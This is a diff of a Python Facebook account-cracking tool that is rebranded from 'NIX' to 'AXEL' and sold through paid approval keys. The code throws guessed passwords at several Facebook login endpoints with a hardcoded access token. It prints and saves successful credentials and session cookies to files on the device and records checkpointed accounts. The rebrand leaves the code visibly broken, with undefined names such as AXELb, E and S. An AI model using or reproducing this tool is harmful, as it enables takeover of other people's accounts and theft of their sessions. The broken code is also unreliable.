@@ -1,7 +1,7 @@
-#-------------------------WRITTEN BY MR-NIX--------------
-#-------------------------- Code by MR-ERROR&NIX-----------
+#-------------------------WRITTEN BY AXEL--------------
+#-------------------------- Code by AXEL-----------
 #-------------------Hello World -----------------------------
-#SC MAKED BY NIX
+#SC MAKED BY AXEL
 import os
 from os import system as clr
 from os import path
@@ -174,7 +174,7 @@ BM = '\x1b[1;101m' # BELAJANG MERAH
 BA = '\x1b[1;100m' # BELAKANG ABU ABU
 import os
 os.system('git pull')
-os.system('mkdir NIX')
+os.system('mkdir AXEL')
 
 import os,zlib
 
@@ -247,7 +247,7 @@ _       ____  ____  ________  _____
 |____| |____||____||____||________||________|
 __________________________________________________
 
- \033[1;92m   ▁ ▂ ▃ ▅ ▆ ▇ █ \033[1;31mAUTHOR:MR:NiX\033[1;92m █ ▇ ▆ ▅ ▃ ▂ ▁                                                         
+ \033[1;92m   ▁ ▂ ▃ ▅ ▆ ▇ █ \033[1;31mAUTHOR:MR:AXEL\033[1;92m █ ▇ ▆ ▅ ▃ ▂ ▁                                                         
 ──────────────────────────────────────────────────
 \033[1;92m Owner   :            Imon Shah
 \033[1;92m Facebook:           Imon Shah
@@ -274,9 +274,9 @@ def result(OKs,cps):
         print(' \x1b[1;92m\x1b[1;91m\x1b[1;96m\x1b[0mThe Cloneing Has Been Complete\x1b[1;96m\x1b[1;91m\x1b[1;92m\x1b[0m')
         print(' TOTAL OK: \x1b[1;92m%s' % str(len(oks)))
         print(' TOTAL CP: \x1b[1;96m%s' % str(len(cps)))
-        input("Press enter to back NIX Menu ")
+        input("Press enter to back AXEL Menu ")
         exit()
-os.system("xd-open https://github.com/Tox1c-143")
+os.system("xd-open https://github.com/imonshah420/Imon-Shah.git")
 def menu():   
     os.system('clear')
     print(logo)
@@ -433,17 +433,17 @@ class main_crack():
 'Content-Length': str(len(content_lenght))}
                 q = session.post("https://graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                 if 'session_key' in q:
-                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);NIXb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={NIXb};{ckkk}"
-                    print(f"\r{R} \x1b[38;5;196m[\033[38;5;46mNIX-💚\x1b[38;5;196m] \x1b[38;5;46m{sid} \x1b[1;92m●\x1b[38;5;46m {ps} {S}\n=#={ckkk}")
+                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);NIXb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={AXELb};{ckkk}"
+                    print(f"\r{R} \x1b[38;5;196m[\033[38;5;46mAXEL-💚\x1b[38;5;196m] \x1b[38;5;46m{sid} \x1b[1;92m●\x1b[38;5;46m {ps} {S}\n=#={ckkk}")
                     
                     Elite(sid,ps,ckkk)
                     oks.append(sid)                 
-                    open('/sdcard/NIX/OK_ids_M1.txt','a').write(sid+'●'+ps+'\n');open('/sdcard/NIX/COOKiEs_M1.txt','a').write(sid+'●'+ps+'●'+cookie+'\n')
+                    open('/sdcard/AXEL/OK_ids_M1.txt','a').write(sid+'●'+ps+'\n');open('/sdcard/AXEL/COOKiEs_M1.txt','a').write(sid+'●'+ps+'●'+cookie+'\n')
                     break
                 elif 'www.facebook.com' in q['error']['message']:
-                     #print(f"\r\x1b[1;96m [NIX-CP] {sid} ● {ps} {S}")
+                     #print(f"\r\x1b[1;96m [AXEL-CP] {sid} ● {ps} {S}")
                      cps.append(sid)
-                     open('/sdcard/NIX/M1-CP.txt','a').write(sid+'●'+ps+'\n')
+                     open('/sdcard/AXEL/M1-CP.txt','a').write(sid+'●'+ps+'\n')
                 else:
                     continue
             loop+=1
@@ -527,16 +527,16 @@ class main_crack():
                 q = session.post("https://api.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                 if 'session_key' in q:
                     ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);NIXb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={NIXb};{ckkk}"
-                    print(f"\r{R} \x1b[38;5;196m[\033[38;5;46mNIX-💚\x1b[38;5;196m] \x1b[38;5;46m{sid} \x1b[1;92m●\x1b[38;5;46m {ps} {S}\n=#={ckkk}")
+                    print(f"\r{R} \x1b[38;5;196m[\033[38;5;46mAXEL-💚\x1b[38;5;196m] \x1b[38;5;46m{sid} \x1b[1;92m●\x1b[38;5;46m {ps} {S}\n=#={ckkk}")
                     
                     Elite(sid,ps,ckkk)
                     oks.append(sid)
-                    open('/sdcard/NIX/OK_ids_M3.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/NIX/COOKiEs_M3.txt','a').write(sid+'●'+ps+'●'+cookie+'\n')
+                    open('/sdcard/AXEL/OK_ids_M3.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/AXEL/COOKiEs_M3.txt','a').write(sid+'●'+ps+'●'+cookie+'\n')
                     break
                 elif 'www.facebook.com' in q['error']['message']:
                    # print(f"\r\x1b[1;96m [NIX-CP] {sid} ● {ps} {S}")
                     cps.append(sid)
-                    open('/sdcard/NIX/M3-CP.txt','a').write(sid+'●'+ps+'\n')
+                    open('/sdcard/AXEL/M3-CP.txt','a').write(sid+'●'+ps+'\n')
                 else:
                     continue
             loop+=1
@@ -585,8 +585,8 @@ class main_crack():
 'sim_serials': "['80973453345210784798']",
 'openid_flow': 'android_login',
 'openid_provider': 'google',
-"email": sid,
-"password": ps,
+"email": E,
+"password": S,
 "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
 "generate_session_cookies": "1",
 "meta_inf_fbmeta": "V2_UNTAGGED",
@@ -620,15 +620,15 @@ class main_crack():
 'Content-Length': str(len(content_lenght))}
                 q = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                 if 'session_key' in q:
-                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);NIXb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={NIXb};{ckkk}"
-                    print(f"\r{R} \x1b[38;5;196m[\033[38;5;46mNIX-💚\x1b[38;5;196m] \x1b[38;5;46m{sid} \x1b[1;92m●\x1b[38;5;46m {ps} {S}\n=#={ckkk}")
+                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);NIXb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={AXELb};{ckkk}"
+                    print(f"\r{R} \x1b[38;5;196m[\033[38;5;46mAXEL-💚\x1b[38;5;196m] \x1b[38;5;46m{sid} \x1b[1;92m●\x1b[38;5;46m {ps} {S}\n=#={ckkk}")
                     
                     Elite(sid,ps,ckkk)
                     oks.append(sid)
-                    open('/sdcard//NIX/OK_ids_M2.txt','a').write(sid+'●'+ps+'\n');open('/sdcard/NIX/COOKiEs_M2.txt','a').write(sid+'●'+ps+'●'+cookie+'\n')
+                    open('/sdcard//AXEL/OK_ids_M2.txt','a').write(sid+'●'+ps+'\n');open('/sdcard/AXEL/COOKiEs_M2.txt','a').write(sid+'●'+ps+'●'+cookie+'\n')
                     break
                 elif 'www.facebook.com' in q['error']['message']:
-                    #print(f"\r\x1b[1;96m [NIX-CP] {sid} ● {ps} {S}")
+                    #print(f"\r\x1b[1;96m [AXEL-CP] {sid} ● {ps} {S}")
                     cps.append(sid)
                     open('/sdcard/NIX/M2-CP.txt','a').write(sid+'●'+ps+'\n')
                 else:
@@ -712,17 +712,17 @@ class main_crack():
 'Content-Length': str(len(content_lenght))}
                 q = session.post("https://b-api.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                 if 'session_key' in q:
-                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);NIXb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={NIXb};{ckkk}"
-                    print(f"\r{R} \x1b[38;5;196m[\033[38;5;46mNIX-💚\x1b[38;5;196m] \x1b[38;5;46m{sid} \x1b[1;92m●\x1b[38;5;46m {ps} {S}\n=#={ckkk}")
+                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);NIXb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={AXELb};{ckkk}"
+                    print(f"\r{R} \x1b[38;5;196m[\033[38;5;46mAXEL-💚\x1b[38;5;196m] \x1b[38;5;46m{sid} \x1b[1;92m●\x1b[38;5;46m {ps} {S}\n=#={ckkk}")
                     
                     Elite(sid,ps,ckkk)
                     oks.append(sid)
-                    open('/sdcard/NIX/OK_ids_M4.txt','a').write(sid+'●'+ps+'\n');open('/sdcard/NIX/COOKiEs_M2.txt','a').write(sid+'●'+ps+'●'+cookie+'\n')
+                    open('/sdcard/AXEL/OK_ids_M4.txt','a').write(sid+'●'+ps+'\n');open('/sdcard/AXEL/COOKiEs_M2.txt','a').write(sid+'●'+ps+'●'+cookie+'\n')
                     break
                 elif 'www.facebook.com' in q['error']['message']:
                   #    print(f"\r\x1b[1;96m [Fuck] {sid} | {ps} {S}")
                     cps.append(sid)
-                    open('/sdcard//NIX/M4-CP.txt','a').write(sid+'●'+ps+'\n')
+                    open('/sdcard//AXEL/M4-CP.txt','a').write(sid+'●'+ps+'\n')
                 else:
                     continue
             loop+=1
@@ -859,10 +859,10 @@ def rcrack(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[151:166]
-                print('\033[1;32m[NIX-OK] '+cid+' | '+ps+'\033[0;97m')
+                print('\033[1;32m[AXEL-OK] '+cid+' | '+ps+'\033[0;97m')
                 print('\n[‎‎💖]\033[0;33m COOKIE = \033[1;34m'+coki+  '  ''  \033[0;97m')
                 linex()
-                open('NIX-OK.txt', 'a').write(cid+' | '+ps+ '\n')
+                open('AXEL-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                 oks.append(cid)
                 break
             elif 'checkpoint' in log_cookies:
@@ -903,7 +903,7 @@ def main_apv():
         else: 
             print('\033[1;92m Now it will work well in all countries')
             print('\033[1;92m-----------------------------------------------------\033[1;97m')
-            print('\033[1;92m[\033[1;92m•\033[1;92m]\033[1;92m Notes : Nix Tools Can buy in all countries!')
+            print('\033[1;92m[\033[1;92m•\033[1;92m]\033[1;92m Notes : AXEL Tools Can buy in all countries!')
             print('\033[1;92m-----------------------------------------------------\033[1;97m')
             print('\033[1;92m [\033[1;92m1\033[1;92m]\033[1;92m 8$ \033[1;92mApproval For 1 month')
             print(' \033[1;92m[\033[1;92m2\033[1;92m]\033[1;92m 6$ \033[1;92mApproval For 15 days')
@@ -915,16 +915,16 @@ def main_apv():
             print(f" \033[1;92mYour Key :\033[31;1m{Xyteee}")
             print("\x1b[1;92m Tools    : FB Cloning");print(" \033[1;92m\n \033[1;92m\033[1;92mNote: If You Are Free User Don't Come IB\033[0;0m");print('\n\x1b[1;92m [•] File Crack \x1b[1;92m\n [•] Random Crack \n [•] Exit Program')
             print("-----------------------------------------------------")
-            url_wa = "https://api.whatsapp.com/send?phone=+8801332718196&text="
+            url_wa = "https://api.whatsapp.com/send?phone=+8801612063812&text="
             choice = input(" Enter your choice  : ")
-            tks = ("Hi Nix Sir, I Need To Buy Your Nix Tools Version 0.0.4 Premium Please Accept My Key To Premium\n\n Name : "+choice+"\n Key : "+Xyteee+"\n Buy Select : "+Picchi)
+            tks = ("Hi AXEL Sir, I Need To Buy Your AXEL Tools Version 0.0.4 Premium Please Accept My Key To Premium\n\n Name : "+choice+"\n Key : "+Xyteee+"\n Buy Select : "+Picchi)
             subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)
             print('-----------------------------------------------------\n Run again with permission from admin')
             main_apv()
     except: 
         sys.exit()
 
-with SiamNIX(max_workers=30) as rhu:
+with AXEL(max_workers=30) as rhu:
  #   rhu.submit(sexy)
     rhu.submit(main_apv)
 
